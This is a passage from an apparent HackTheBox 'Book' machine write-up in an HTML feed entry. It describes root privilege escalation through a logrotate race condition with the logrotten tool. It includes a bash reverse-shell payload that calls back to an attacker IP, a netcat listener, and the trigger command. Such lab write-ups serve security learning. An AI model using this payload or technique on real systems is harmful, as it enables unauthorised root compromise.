&lt;p&gt;pspy tool confirm this trough the execution of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logrotate&lt;/code&gt; tool under root privilege.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-pspy.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can winning a race condition in logrotate to elevate privileges.&lt;/p&gt;

&lt;p&gt;References - logrotate exploitation :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/whotwagner/logrotten&quot;&gt;https://github.com/whotwagner/logrotten&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@ashishrohra/race-condition-exaplained-for-dummies-10c54a265192&quot;&gt;https://medium.com/@ashishrohra/race-condition-exaplained-for-dummies-10c54a265192&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition&quot;&gt;https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/&quot;&gt;https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;1---requirement&quot;&gt;1 - Requirement&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Logrotate has to be executed as root –&amp;gt; Yes, pspy verify this.&lt;/li&gt;
  &lt;li&gt;The logpath needs to be in control of the attacker –&amp;gt; Yes, linpeas verify this&lt;/li&gt;
  &lt;li&gt;Any option that creates files is set in the logrotate configuration –&amp;gt; Yes&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;2---compile-logrotten&quot;&gt;2 - Compile logrotten&lt;/h4&gt;

&lt;p&gt;From target machine :&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;reader@book:/tmp$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; logrotten logrotten.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;3---prepare-payload&quot;&gt;3 - Prepare payload&lt;/h4&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;reader@book:/tmp$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nano payload
&lt;span class=&quot;go&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;bash -i &amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.10.14.223/1234 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;4---listen-and-wait-root-shell-redirection&quot;&gt;4 - Listen and wait root shell redirection&lt;/h4&gt;

&lt;p&gt;From attacking machine :&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1234
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;5---exploit&quot;&gt;5 - Exploit&lt;/h4&gt;

&lt;p&gt;To trigger the rotation of the log, we write before in access.log.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;reader@book:/tmp$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;exploit /home/reader/backups/access.log &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./logrotten &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; ./payload /home/reader/backups/access.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-exploit.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;flag-root&quot;&gt;Flag root&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-rootflag.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Book machine is compromise.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;trophy&quot;&gt;&lt;strong&gt;&lt;center&gt;Trophy&lt;/center&gt;&lt;/strong&gt;&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;There is no friend as loyal as a book.&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;Ernest Hemingway&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>pcw3r</name></author><category term="HackTheBox" /><category term="Machine" /><category term="LINUX" /><category term="MEDIUM" /><category term="ENUMERATION" /><category term="DATABASE EXPLOITATION" /><category term="SQL TRUNCATION" /><category term="CROSS-SITE SCRIPTING" /><category term="RACE CONDITION" /><category term="PAYLOAD" /><summary type="html">Ref°: HTB-10-Machine</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/images/book/HTB-Badge-Book.png" /><media:content medium="image" url="/assets/images/book/HTB-Badge-Book.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>